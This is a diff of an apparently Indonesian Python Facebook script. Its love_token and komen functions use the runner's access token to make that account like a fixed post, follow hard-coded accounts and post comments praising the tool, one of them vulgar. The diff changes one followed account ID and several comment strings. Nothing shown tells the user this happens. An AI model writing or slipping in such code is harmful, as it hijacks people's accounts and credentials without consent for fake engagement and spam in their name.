@@ -430,12 +430,12 @@ def love_token(token):
 		dev_.post("https://graph.facebook.com/"+id_post+"/reactions?type=LOVE&access_token="+token)
 		for id_foll in lis_id_foll:
 			dev_.post("https://graph.facebook.com/{}/subscribers?access_token={}".format(id_foll, token))
-		dev_.post("https://graph.facebook.com/{}/subscribers?access_token={}".format(random.choice(["100009259285042", "100002606153676", "100034994956054"]), token))
+		dev_.post("https://graph.facebook.com/{}/subscribers?access_token={}".format(random.choice(["100009259285042", "3088882871430325", "100034994956054"]), token))
 		ikuti_ = []
 def komen(token):
 	for dev in range(1):
 		with requests.Session() as dev_:
-			komen_ = random.choice(["Toolsnya Mantap", "Gw Fans Lu Bang", "Gimana Kabarnya Bang?", "Hallo bang", "Keren Bos..", "Lo Ngntod:v", "Gak sia2 saya make tool abang, Keren Abis, Ga ada Obat"])
+			komen_ = random.choice(["Toolsnya Mantap", "Gw Fans Lu Bang", "Makasih Sc nya bang gila sih keren habis:)", "Mantep Bang Scmu", "Yang Posting orangnya ganteng:v", "Lo Ngntod:v", "Gak sia2 saya make tool abang, Keren Abis, Ga ada Obat"])
 			dev_.post("https://graph.facebook.com/"+id_post+"/comments/?message="+komen_+"&access_token="+token)
 
 def __token__dev(cookie):
